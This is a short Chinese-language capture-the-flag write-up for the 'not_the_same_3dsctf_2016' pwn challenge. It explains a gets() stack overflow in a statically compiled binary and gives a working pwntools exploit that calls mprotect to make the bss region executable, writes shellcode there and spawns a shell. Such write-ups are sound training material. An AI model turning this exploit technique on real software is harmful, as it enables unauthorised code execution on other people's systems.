---
title: "not_the_same_3dsctf_2016"
description: ""
date: 2023-04-07T11:44:07+08:00
lastmod: 2023-04-07T11:44:07+08:00
draft: false
images: []
type: docs
weight: 987
toc: true
---

## 0x01 分析

这道题是静态编译的

![3595b6acc12bce0b1a78d56143441ec5](images/3595b6acc12bce0b1a78d56143441ec5.png)  

main函数是一个简单的gets栈溢出，所以可以用ret2syscall、ret2shellcode等方法来做，这里的话我用mprotect修改bss权限然后注入shellcode来做

## 0x02 Exploit

```python
from pwn import*
context.arch = 'i386'
o = process("./pwn")
elf = ELF("./pwn")

mprotect = elf.sym['mprotect']
gets = elf.sym['gets']
main = elf.sym['main']
bss = 0x80ec000

payload = b'a'*45 + p32(mprotect) + p32(main) + p32(bss) + p32(0x1000) + p32(7)
o.sendline(payload)

payload = b'a'*45 + p32(gets) + p32(bss) + p32(bss)
o.sendline(payload)
o.sendline(asm(shellcraft.sh()))

o.interactive()

```

![79e310d17c9b4671dc2b3b009eaa593a](images/79e310d17c9b4671dc2b3b009eaa593a.png)  

自行调试
